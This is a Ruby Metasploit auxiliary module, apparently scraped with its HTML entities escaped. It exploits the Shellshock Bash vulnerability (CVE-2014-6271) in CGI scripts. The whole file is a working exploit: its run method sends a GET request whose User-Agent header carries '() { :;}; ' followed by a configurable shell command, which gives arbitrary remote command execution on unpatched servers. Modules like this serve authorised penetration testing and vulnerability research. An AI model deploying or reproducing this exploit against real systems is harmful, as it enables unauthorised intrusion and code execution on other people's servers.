 
class Metasploit3 < Msf::Auxiliary
 
    include Msf::Exploit::Remote::HttpClient
 
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;bashedCgi&#039;,
            &#039;Description&#039;    => %q{
               Quick & dirty module to send the BASH exploit payload (CVE-2014-6271) to CGI scripts that are BASH-based or invoke BASH, to execute an arbitrary shell command.
            },
            &#039;Author&#039;         =>
              [
                &#039;Stephane Chazelas&#039;,                      # vuln discovery
                &#039;Shaun Colley <scolley at ioactive.com>&#039;  # metasploit module
              ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     => [ &#039;CVE&#039;, &#039;2014-6271&#039; ],
            &#039;Targets&#039;        =>
                [
                    [ &#039;cgi&#039;, {} ]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;Payload&#039;        =>
                {
                &#039;Space&#039;      => 1024,
                &#039;DisableNops&#039; => true
                },
            &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => 0 }
        ))
 
            register_options(
                [
                    OptString.new(&#039;TARGETURI&#039;, [true, &#039;Absolute path of BASH-based CGI&#039;, &#039;/&#039;]),
                    OptString.new(&#039;CMD&#039;, [true, &#039;Command to execute&#039;, &#039;/usr/bin/touch /tmp/metasploit&#039;])
                ], self.class)
    end
 
    def run
        res = send_request_cgi({
            &#039;method&#039;   => &#039;GET&#039;,
            &#039;uri&#039;      => datastore[&#039;TARGETURI&#039;],
            &#039;agent&#039;    => "() { :;}; " + datastore[&#039;CMD&#039;]
        })
 
        if res && res.code == 200
            print_good("Command sent - 200 received")
        else
            print_error("Command sent - non-200 reponse")
        end
    end
end

